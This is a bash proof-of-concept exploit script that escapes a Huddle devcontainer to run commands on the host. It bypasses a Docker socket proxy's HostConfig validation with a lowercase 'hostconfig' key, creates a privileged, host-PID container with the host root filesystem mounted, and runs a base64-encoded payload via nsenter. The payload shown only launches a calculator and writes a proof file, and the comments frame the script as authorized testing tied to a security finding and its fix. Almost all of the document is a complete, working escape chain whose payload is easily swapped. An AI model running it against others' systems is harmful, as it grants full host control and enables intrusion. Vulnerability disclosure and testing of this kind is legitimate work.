#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# PoC: host command execution from inside a Huddle devcontainer
# Demonstrates finding #1 (case-insensitive HostConfig bypass) on the classic
# socket-proxy. Authorized security testing only — run against your OWN Huddle
# instance to confirm the finding in docs/security/dind-findings-vs-main.md.
#
# Payload is deliberately harmless: it launches a calculator on the host (the
# classic "pop calc" proof) AND drops a proof-of-execution file. It does NOT
# persist, exfiltrate, or destroy anything, and it cleans up the helper
# container. Read it before running.
#
#   HOW IT WORKS
#   The proxy validates `body.HostConfig` with EXACT-CASE key access, but
#   dockerd's Go JSON decoder matches struct fields CASE-INSENSITIVELY. Sending
#   the create body with a lowercase `hostconfig` key makes the proxy inspect
#   `body.HostConfig === undefined` (→ allow), while dockerd still honours the
#   privileged / host-PID / host-rootfs settings. We then run in the host's
#   namespaces via nsenter.
#
#   THE FIX (see report): deep-lowercase keys before validation (lowerKeysDeep)
#   and read HostConfig case-insensitively in the router.
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

# ── Locate the Docker proxy socket exposed inside the devcontainer ────────────
SOCK=""
if [[ -n "${DOCKER_HOST:-}" && "${DOCKER_HOST}" == unix://* ]]; then
  SOCK="${DOCKER_HOST#unix://}"
fi
for cand in "$SOCK" /var/run/huddle/docker.sock /var/run/dind/docker.sock /var/run/docker.sock; do
  if [[ -n "$cand" && -S "$cand" ]]; then SOCK="$cand"; break; fi
done
[[ -S "$SOCK" ]] || { echo "no docker proxy socket found (set DOCKER_HOST)"; exit 1; }
echo "[*] using proxy socket: $SOCK"

API="http://d"
CURL=(curl -s --unix-socket "$SOCK")
IMAGE="${POC_IMAGE:-alpine:3.20}"
STAMP="poc-$$"                       # unique-ish tag; no Date.now needed
PROOF="/tmp/huddle-host-escape-${STAMP}.txt"

# ── The payload that runs INSIDE the escaping container ───────────────────────
# The host root fs is bind-mounted at /host and we share the host PID namespace,
# so `nsenter -t 1 -a` executes in host init's namespaces = on the host.
# Try GUI calculators (Linux + WSL/Windows), then always write a proof file.
read -r -d '' PAYLOAD <<PAYLOAD_EOF || true
set +e
# 1) proof of host-side execution (works headless)
{
  echo "HUDDLE HOST-ESCAPE PoC ($STAMP)"
  echo "ran in host namespaces as: \$(nsenter -t 1 -m -u -i -n -p -- id 2>/dev/null || id)"
  echo "host uname: \$(nsenter -t 1 -m -u -i -n -p -- uname -a 2>/dev/null || uname -a)"
  echo "host /etc/hostname: \$(cat /host/etc/hostname 2>/dev/null)"
} > "/host$PROOF" 2>/dev/null
# 2) pop calc on the host (best-effort across environments)
nsenter -t 1 -m -u -i -n -p -- sh -c '
  for c in "cmd.exe /c start calc" gnome-calculator kcalc xcalc "calc.exe"; do
    DISPLAY="\${DISPLAY:-:0}" \$c >/dev/null 2>&1 && exit 0
  done
' 2>/dev/null
echo "payload done; proof at (host) $PROOF"
PAYLOAD_EOF

# ── Make sure the image is present (image pull is allowed through the proxy) ──
echo "[*] pulling $IMAGE via proxy ..."
"${CURL[@]}" -X POST "$API/images/create?fromImage=${IMAGE%%:*}&tag=${IMAGE##*:}" >/dev/null || true

# ── Create the escaping container using the lowercase `hostconfig` bypass ─────
# NOTE: the docker CLI always capitalises HostConfig, so we craft the raw request.
# The payload is base64-encoded to avoid any JSON/shell quoting issues.
PAYLOAD_B64=$(printf '%s' "$PAYLOAD" | base64 | tr -d '\n')
CREATE_BODY=$(cat <<JSON
{
  "Image": "$IMAGE",
  "Cmd": ["/bin/sh","-c","echo $PAYLOAD_B64 | base64 -d | /bin/sh"],
  "hostconfig": { "privileged": true, "pidmode": "host", "binds": ["/:/host"] }
}
JSON
)

echo "[*] creating escaping container (lowercase hostconfig → skips proxy guard) ..."
CID=$("${CURL[@]}" -X POST -H 'Content-Type: application/json' \
      -d "$CREATE_BODY" "$API/containers/create?name=huddle-poc-$STAMP" \
      | sed -n 's/.*"Id":"\([a-f0-9]*\)".*/\1/p')

if [[ -z "$CID" ]]; then
  echo "[-] create was refused — the proxy on this instance is NOT vulnerable (patched?)."
  echo "    Response above. Finding #1 appears closed here."
  exit 2
fi
echo "[+] created $CID — proxy accepted a PRIVILEGED + host-PID + host-rootfs container."

cleanup() { "${CURL[@]}" -X DELETE "$API/containers/$CID?force=true" >/dev/null 2>&1 || true; }
trap cleanup EXIT

echo "[*] starting it ..."
"${CURL[@]}" -X POST "$API/containers/$CID/start" >/dev/null
"${CURL[@]}" -X POST "$API/containers/$CID/wait" >/dev/null || true

echo
echo "[+] ESCAPE CONFIRMED. Check the host for a calculator window and the proof file:"
echo "      (on the host)  $PROOF"
echo "[*] container logs:"
"${CURL[@]}" "$API/containers/$CID/logs?stdout=true&stderr=true" | tr -d '\r' | sed 's/^/      /'
